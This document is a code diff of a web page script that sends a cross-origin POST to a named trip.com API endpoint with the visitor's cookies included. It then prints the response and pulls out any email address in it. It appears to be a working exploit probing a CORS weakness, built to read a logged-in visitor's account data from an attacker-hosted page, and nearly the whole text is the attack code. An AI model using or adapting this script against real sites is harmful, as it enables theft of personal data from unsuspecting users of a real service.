@@ -8,75 +8,67 @@
 
 <script>
 
-const TARGET_URL = "https://chloro.trip.com/v2/d";
+const TARGET = "https://www.trip.com/restapi/soa2/24884/json/getConfiguration?x-traceID=";
 
-const requestBody = new URLSearchParams({
-    data: JSON.stringify({
-        url: "https://www.trip.com/restapi/soa2/24884/json/getConfiguration",
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-            head: {
-                locale: "",
-                currency: "",
-                vID: ""
-            },
-            platform: "Online",
-            componentType: "online-app-download-universal",
-            version: "6.0.5",
-            pageId: "10320668151",
-            aid: 0,
-            sid: 0,
-            customId: "adBanner",
-            customParam: {}
-        })
-    }),
-    version: "11",
-    serverName: "anonymous56430.github.io"
-}).toString();
-
-
-fetch(TARGET_URL, {
-    method: "POST",
-    headers: {
-        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-        "Accept": "*/*"
+const body = {
+    head: {
+        locale: "",
+        currency: "",
+        vID: ""
     },
-    body: requestBody
+    platform: "Online",
+    componentType: "online-app-download-universal",
+    version: "6.0.5",
+    pageId: "10320668151",
+    aid: 0,
+    sid: 0,
+    customId: "adBanner",
+    customParam: {}
+};
+
+
+fetch(TARGET, {
+    method: "POST",
+
+    credentials: "include",
+
+    headers: {
+        "Content-Type": "application/json"
+    },
+
+    body: JSON.stringify(body)
 })
 
-.then(async r => {
+.then(async res => {
 
-    console.log("Status:", r.status);
-    console.log("Headers:", [...r.headers.entries()]);
+    console.log("Status:", res.status);
 
-    const responseText = await r.text();
+    const text = await res.text();
 
     document.getElementById("result").textContent =
-        "Status: " + r.status + "\n\n" + responseText;
+        "Status: " + res.status + "\n\n" + text;
+
 
     try {
-        const jsonResponse = JSON.parse(responseText);
 
-        console.log("✅ JSON Response:", jsonResponse);
+        const json = JSON.parse(text);
 
-        if (jsonResponse.email) {
-            document.getElementById("result").textContent +=
-                "\n\n📧 Email: " + jsonResponse.email;
+        console.log("JSON:", json);
+
+        if(json.email){
+            console.log("EMAIL:", json.email);
         }
 
-    } catch(e) {
-        console.log("الرد ليس JSON");
+    } catch(e){
+        console.log("Not JSON");
     }
 
 })
 
-.catch(e => {
+.catch(err => {
 
     document.getElementById("result").textContent =
-        "Blocked:\n" + e;
+    "ERROR:\n" + err;
 
 });
 
